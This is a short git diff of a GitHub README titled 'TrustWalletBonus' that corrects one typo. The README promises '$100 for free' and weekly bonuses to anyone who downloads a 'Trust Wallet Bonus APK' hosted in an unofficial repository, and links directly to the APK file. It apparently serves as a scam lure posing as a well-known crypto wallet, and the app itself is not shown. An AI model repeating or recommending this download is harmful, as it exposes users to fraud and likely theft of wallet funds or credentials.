@@ -1,7 +1,7 @@
 # TrustWalletBonus
 ## Get 100$ For Free Just Download App 
 ## Get Bonus Everyone And every week
-Download Trust Wallet Bonsu APK now to access the top-ranked cryptocurrency wallet with a myriad of features for managing your digital assets securely. Click on the image to initiate the download and experience the convenience of managing your crypto portfolio anytime, anywhere
+Download Trust Wallet Bonus APK now to access the top-ranked cryptocurrency wallet with a myriad of features for managing your digital assets securely. Click on the image to initiate the download and experience the convenience of managing your crypto portfolio anytime, anywhere
 
 
 [![Download APK](11.jpeg)](https://github.com/TrustWalletBonus100/TrustWalletBonus/raw/main/TrustWalletbonus.apk) ]
